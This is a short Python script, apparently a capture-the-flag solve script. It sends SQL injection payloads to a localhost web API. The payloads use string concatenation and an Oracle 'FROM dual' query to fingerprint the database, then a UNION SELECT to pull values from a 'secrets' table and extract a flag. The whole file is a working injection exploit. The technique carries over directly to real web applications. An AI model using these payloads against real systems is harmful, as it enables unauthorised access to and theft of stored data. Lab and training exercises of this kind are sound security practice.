#!/usr/bin/env python3
import requests
import re

TARGET = "http://localhost:5008/api/service"

def main():
    # Test || concatenation
    r = requests.get(TARGET, params={"name": "Auth'||'entication"})
    if "Authentication" in r.text:
        print("[+] || concatenation works - Oracle or PostgreSQL")
    
    # Test FROM dual (Oracle)
    r = requests.get(TARGET, params={"name": "' UNION SELECT 1,'test','x','x' FROM dual--"})
    if "test" in r.text:
        print("[+] FROM dual works - Oracle confirmed!")
    
    # Extract flag
    r = requests.get(TARGET, params={"name": "' UNION SELECT 1,value,'x','x' FROM secrets--"})
    flag = re.search(r'FLAG\{[^}]+\}', r.text)
    if flag:
        print(f"[+] Flag: {flag.group(0)}")

if __name__ == "__main__":
    main()
